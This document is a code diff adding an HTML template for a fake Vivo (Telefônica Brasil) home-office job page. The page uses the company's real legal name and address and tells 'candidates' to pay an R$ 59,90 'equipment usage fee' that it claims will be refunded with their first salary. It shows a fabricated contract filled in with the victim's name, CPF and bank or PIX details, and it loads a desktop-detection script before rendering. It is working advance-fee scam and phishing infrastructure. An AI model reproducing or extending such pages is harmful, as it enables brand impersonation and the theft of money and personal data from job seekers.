@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "r7dfa6ijq3");
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalização - Vagas Home Office - Vivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+    
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+</head>
+<body>
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <a href="{{ url_for('index') }}">
+                        <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                    </a>
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO &gt; HOME OFFICE &gt; FINALIZAÇÃO</span>
+        </div>
+    </div>
+    
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <div class="card shadow-sm">
+                    <div class="card-header" style="background-color: #660099; color: white;">
+                        <h5 class="mb-0">Processo Finalizado</h5>
+                    </div>
+                    <div class="card-body p-5">
+                        <div class="text-center my-4">
+                            <h3 style="color: #660099; font-weight: 500; margin-bottom: 20px;">FINALIZE SEU CADASTRO, {{ nome|default('Candidato') }}!</h3>
+                            <p style="color: #333; font-size: 16px; margin-bottom: 30px;">Falta apenas um passo para você começar a trabalhar como atendente Vivo!</p>
+                            <div class="container-fluid px-0" style="max-width: 98%;">
+                            
+                            <!-- Benefícios -->
+                            <div class="card mb-4 w-100" style="border: 1px solid #ddd; border-radius: 10px; max-width: 100%; margin-left: auto; margin-right: auto;">
+                                <div class="card-body p-4">
+                                    <h5 style="color: #660099; margin-bottom: 15px;">Seus Benefícios:</h5>
+                                    
+                                    <div class="row align-items-center mb-3">
+                                        <div class="col-md-6">
+                                            <h6 style="color: #333; font-weight: 600; text-align: left;">Remuneração:</h6>
+                                            <ul class="text-start" style="padding-left: 20px;">
+                                                <li>Salário base: <strong>R$ 1.788,60</strong></li>
+                                                <li>Vale alimentação: <strong>R$ 1.236,00</strong></li>
+                                                <li>Bônus por dia de trabalho em fim de semana: <strong>R$ 178,40</strong></li>
+                                            </ul>
+                                        </div>
+                                        
+                                        <div class="col-md-6">
+                                            <!-- Cartões em miniatura -->
+                                            <div class="d-flex justify-content-center mb-2 flex-wrap">
+                                                <!-- Cartão Salário Vivo Mini -->
+                                                <div class="position-relative" style="margin-right: 8px; margin-bottom: 8px;">
+                                                    <img src="https://i.ibb.co/whdJtR90/assets-task-01jwsgn3epfdfbpr0dxkqhkwe2-1748908070-img-1-1.png" alt="Cartão Salário Vivo" style="width: 120px; height: 80px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); object-fit: cover;">
+                                                    <div class="position-absolute" style="bottom: 8px; left: 8px; color: white; font-weight: bold; font-size: 10px; font-family: 'Courier New', Courier, monospace; letter-spacing: 0.5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.7);" id="mini-card-user-name">
+                                                        {{ nome|default('CANDIDATO') }}
+                                                    </div>
+                                                </div>
+                                                
+                                                <!-- Cartão de Saúde Mini -->
+                                                <div style="background: linear-gradient(135deg, #660099 0%, #9933CC 100%); border-radius: 6px; padding: 8px; color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-right: 8px; margin-bottom: 8px; width: 120px; height: 70px;">
+                                                    <div class="d-flex justify-content-between align-items-start" style="height: 100%;">
+                                                        <img src="https://www.valesaude.com.br/images/logo-vale-saude.webp?imwidth=3840" alt="Vale Saúde" style="height: 15px; filter: brightness(0) invert(1);">
+                                                        <div class="text-end">
+                                                            <span style="font-size: 8px; opacity: 0.8;">Vivo</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                
+                                                <!-- Cartão Alelo Mini -->
+                                                <div style="background: linear-gradient(135deg, #115F48 0%, #1A8C6A 100%); border-radius: 6px; padding: 8px; color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 120px; height: 70px;">
+                                                    <div class="d-flex justify-content-between align-items-start" style="height: 100%;">
+                                                        <img src="https://cdn.worldvectorlogo.com/logos/alelo-1.svg" alt="Alelo" style="height: 15px; background-color: white; padding: 2px; border-radius: 2px;">
+                                                        <div class="text-end">
+                                                            <span style="font-size: 8px; opacity: 0.8;">Vivo</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <ul class="text-start" style="padding-left: 20px;">
+                                                <li>Plano de saúde Vale Saúde</li>
+                                                <li>Cobertura nacional</li>
+                                                <li>Telemedicina 24 horas</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Kit de equipamentos -->
+                                    <h6 style="color: #333; font-weight: 600; text-align: left; margin-top: 20px;">Kit de Equipamentos:</h6>
+                                    <div class="row align-items-center">
+                                        <div class="col-md-6">
+                                            <img src="https://i.ibb.co/s9TNbjWP/assets-task-01jvmjhjnefe58ezr0bj1a70h5-1747668560-img-1-1.webp" alt="Kit de Equipamentos" style="max-width: 100%; height: auto; border-radius: 8px; margin-bottom: 10px;">
+                                        </div>
+                                        <div class="col-md-6">
+                                            <ul class="text-start" style="padding-left: 20px;">
+                                                <li>Notebook Vivo corporativo</li>
+                                                <li>Headset com microfone profissional</li>
+                                                <li>Internet de 50 Mb dedicada</li>
+                                                <li>Colete personalizado Vivo</li>
+                                                <li>Material de treinamento</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Taxa de Uso dos Equipamentos -->
+                            <div class="card mb-4" style="border: 1px solid #ddd; border-radius: 10px; width: 120%; max-width: 120%; margin-left: -10%; margin-right: -10%;">
+                                <div class="card-header" style="background-color: #F5F5F5; border-bottom: 1px solid #ddd;">
+                                    <h5 style="color: #660099; margin-bottom: 0; font-weight: 500; font-size: 1.3rem;">Taxa de Uso dos Equipamentos</h5>
+                                </div>
+                                <div class="card-body p-4">
+                                    <p class="text-start mb-3">Para garantir a segurança dos equipamentos que serão enviados para sua casa, é necessário o pagamento de uma <strong>Taxa de Uso dos Equipamentos</strong> no valor de R$ 59,90. Esta taxa é cobrada por segurança, pois os equipamentos (notebook, headset e materiais) serão enviados diretamente para o endereço do candidato.</p>
+                                    
+                                    <div class="alert alert-light text-start" style="border: 1px solid #e5e5e5; background-color: #f9f9f9;">
+                                        <h6 style="color: #333; font-weight: 600; margin-bottom: 10px;">Equipamentos inclusos na taxa:</h6>
+                                        <ul style="padding-left: 20px; margin-bottom: 0;">
+                                            <li class="mb-2"><strong>Notebook Vivo corporativo</strong> para home office;</li>
+                                            <li class="mb-2"><strong>Headset profissional</strong> com microfone;</li>
+                                            <li class="mb-2"><strong>Kit de materiais</strong> e uniforme Vivo;</li>
+                                            <li class="mb-2">Envio seguro e rastreado dos equipamentos.</li>
+                                        </ul>
+                                    </div>
+                                    
+                                    <div class="alert alert-success mt-3 mb-3 text-start" style="background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724;">
+                                        <h6 class="alert-heading mb-2"><i class="fas fa-check-circle me-2"></i> Valor reembolsado!</h6>
+                                        <p class="mb-0">Esta taxa será <strong>integralmente reembolsada</strong> junto com seu primeiro salário. Os cartões (Cartão Salário, Vale Saúde e Alelo) serão enviados gratuitamente.</p>
+                                    </div>
+                                    
+                                    <div class="d-flex justify-content-between align-items-center mt-4">
+                                        <div class="text-start">
+                                            <h5 style="color: #333; margin-bottom: 0;">Taxa de Segurança:</h5>
+                                            <p class="text-muted small mb-0">Taxa de Uso dos Equipamentos</p>
+                                        </div>
+                                        <div>
+                                            <h3 style="color: #660099; font-weight: 600; margin-bottom: 0;">R$ 59,90</h3>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="alert alert-info" style="background-color: #E6F7FF; color: #004085; border-color: #B8DAFF;">
+                                <i class="fas fa-info-circle me-2"></i>
+                                Após o pagamento da taxa de segurança, você receberá os equipamentos em até 3 dias úteis. O valor será reembolsado integralmente no seu primeiro salário.
+                            </div>
+                            
+                            <!-- Contrato -->
+                            <div class="card mb-4" style="border: 1px solid #ddd; border-radius: 0px; width: 120%; max-width: 120%; margin-left: -10%; margin-right: -10%; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                                <div class="card-header" style="background-color: #F5F5F5; border-bottom: 1px solid #ddd; border-radius: 0;">
+                                    <h5 style="color: #333; margin-bottom: 0; font-weight: 500; font-size: 1.1rem;">TERMO DE ACORDO - TAXA DE USO DOS EQUIPAMENTOS</h5>
+                                </div>
+                                <div class="card-body p-4" style="font-size: 0.85rem; text-align: justify;">
+                                    <p>Pelo presente instrumento, a <strong>TELEFÔNICA BRASIL S.A.</strong>, pessoa jurídica de direito privado, inscrita no CNPJ/MF sob o nº 02.558.157/0001-62, com sede na Av. Eng. Luiz Carlos Berrini, 1376, Cidade Monções, São Paulo - SP, CEP 04571-936, doravante denominada <strong>VIVO</strong>, e o(a) Sr(a). <strong>{{ nome|default('Candidato') }}</strong>, portador(a) do CPF <strong>{{ cpf|default('000.000.000-00') }}</strong>, doravante denominado(a) <strong>COLABORADOR(A)</strong>, firmam o presente acordo:</p>
+                                    
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <p><strong>CLÁUSULA PRIMEIRA - OBJETO</strong><br>
+                                            O presente Termo estabelece as condições para o pagamento da Taxa de Uso dos Equipamentos que serão enviados ao(à) COLABORADOR(A).</p>
+                                            
+                                            <p><strong>CLÁUSULA SEGUNDA - VALOR E FINALIDADE</strong><br>
+                                            A VIVO realizará a cobrança única no valor de <strong>R$ 59,90</strong> referente à Taxa de Segurança para envio dos equipamentos de trabalho.</p>
+                                            
+                                            <p><strong>CLÁUSULA TERCEIRA - EQUIPAMENTOS</strong><br>
+                                            Os equipamentos incluem: notebook corporativo, headset profissional, uniforme e materiais de treinamento, todos enviados com segurança.</p>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <p><strong>CLÁUSULA QUARTA - REEMBOLSO</strong><br>
+                                            O valor de <strong>R$ 59,90</strong> será integralmente reembolsado junto com o primeiro salário no valor de <strong>R$ 1.788,60</strong> no dia <strong>05/07/2025</strong> através do {% if metodo_recebimento and metodo_recebimento.metodo == 'cartao_salario' %}Cartão Salário Vivo em parceria com MasterCard{% elif metodo_recebimento and metodo_recebimento.metodo == 'pix' %}PIX para a chave {{ metodo_recebimento.pix_type }} <strong>{{ metodo_recebimento.pix_key }}</strong>{% elif metodo_recebimento %}Transferência Bancária para sua conta no <strong>{{ metodo_recebimento.banco }}</strong>, Agência <strong>{{ metodo_recebimento.agencia }}</strong>, Conta <strong>{{ metodo_recebimento.conta }}</strong> ({{ metodo_recebimento.tipo_conta }}){% else %}Cartão Salário Vivo{% endif %}.</p>
+                                            
+                                            <p><strong>CLÁUSULA QUINTA - CARTÕES GRATUITOS</strong><br>
+                                            Os cartões (Cartão Salário Vivo, Vale Saúde e Alelo) serão enviados <strong>gratuitamente</strong> após a contratação efetiva.</p>
+                                            
+                                            <p><strong>Data de aceitação:</strong> {{ now.day }}/{{ now.month }}/{{ now.year }}</p>
+                                            
+                                            <div class="text-left mt-3">
+                                                <img src="https://i.ibb.co/0g4bQFV/assets-task-01jvrq4s15fmdrtgarhpe5528c-1747807637-img-0-11zon-11zon.webp" alt="Selo de Autenticidade" style="max-width: 120px;" class="img-fluid">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Toggle para concordar com o contrato -->
+                            <div class="form-check form-switch d-flex align-items-center justify-content-center mb-4">
+                                <input class="form-check-input me-2" type="checkbox" id="contratoSwitch" style="width: 3em; height: 1.5em;">
+                                <label class="form-check-label" for="contratoSwitch" style="font-weight: 500; color: #333;">
+                                    Li e concordo com os termos do contrato acima
+                                </label>
+                            </div>
+                            
+                            <a href="{{ url_for('chat') }}" class="btn vivo-btn px-5 mt-3" id="btnReceber" disabled>RECEBER EQUIPAMENTOS</a>
+                            
+                            <script>
+                                document.addEventListener('DOMContentLoaded', function() {
+                                    const contratoSwitch = document.getElementById('contratoSwitch');
+                                    const btnReceber = document.getElementById('btnReceber');
+                                    
+                                    contratoSwitch.addEventListener('change', function() {
+                                        if (this.checked) {
+                                            btnReceber.removeAttribute('disabled');
+                                            btnReceber.style.opacity = '1';
+                                        } else {
+                                            btnReceber.setAttribute('disabled', 'disabled');
+                                            btnReceber.style.opacity = '0.5';
+                                        }
+                                    });
+                                    
+                                    // Inicialmente desativado
+                                    btnReceber.style.opacity = '0.5';
+
+                                    // Adicionar handler para o clique do botão
+                                    btnReceber.addEventListener('click', function(e) {
+                                        e.preventDefault();
+                                        const currentUrl = new URL(window.location.href);
+                                        const chatUrl = new URL("{{ url_for('chat') }}", window.location.origin);
+                                        
+                                        // Copiar todos os parâmetros da URL atual para a nova URL
+                                        currentUrl.searchParams.forEach((value, key) => {
+                                            chatUrl.searchParams.append(key, value);
+                                        });
+                                        
+                                        window.location.href = chatUrl.toString();
+                                    });
+                                });
+                            </script>
+                            <div class="mt-2">
+                                <a href="{{ url_for('index') }}" class="btn btn-link text-secondary">Voltar ao início</a>
+                            </div>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Footer -->
+    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Produtos e Serviços</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Suporte</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Institucional</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="mb-3">Redes Sociais</h5>
+                    <div class="d-flex mb-4">
+                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
+                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <h5 class="mb-3">Baixe o App</h5>
+                    <div class="d-flex">
+                        <a href="#" class="text-white me-3"><i class="fab fa-app-store-ios"></i> App Store</a>
+                        <a href="#" class="text-white"><i class="fab fa-google-play"></i> Google Play</a>
+                    </div>
+                </div>
+            </div>
+            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+                
+    <!-- Bootstrap, jQuery e Popper.js -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Buscar nome do usuário e exibir no cartão mini
+            const miniCardUserName = document.getElementById('mini-card-user-name');
+            if (miniCardUserName) {
+                let userName = null;
+                
+                // Tentar buscar do localStorage primeiro
+                const userData = localStorage.getItem('userData');
+                if (userData) {
+                    try {
+                        const parsedData = JSON.parse(userData);
+                        if (parsedData.nome) {
+                            userName = parsedData.nome;
+                        }
+                    } catch (e) {
+                        console.log('Erro ao processar dados do localStorage:', e);
+                    }
+                }
+                
+                // Se não encontrou no localStorage, tentar buscar do sessionStorage
+                if (!userName) {
+                    const sessionData = sessionStorage.getItem('userData');
+                    if (sessionData) {
+                        try {
+                            const parsedSessionData = JSON.parse(sessionData);
+                            if (parsedSessionData.nome) {
+                                userName = parsedSessionData.nome;
+                            }
+                        } catch (e) {
+                            console.log('Erro ao processar dados do sessionStorage:', e);
+                        }
+                    }
+                }
+                
+                // Processar o nome para mostrar apenas os dois primeiros nomes válidos
+                if (userName) {
+                    const formattedName = formatCardName(userName);
+                    miniCardUserName.textContent = formattedName;
+                }
+            }
+            
+            // Função para formatar o nome do cartão
+            function formatCardName(fullName) {
+                if (!fullName) return 'CANDIDATO';
+                
+                // Lista de preposições a serem removidas
+                const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
+                
+                // Dividir o nome em palavras e converter para maiúsculo
+                const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
+                
+                // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
+                const validNames = words.filter(word => !prepositions.includes(word));
+                
+                // Retornar os dois primeiros nomes válidos
+                return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
+            }
+        });
+    </script>
+</body>
+</html>
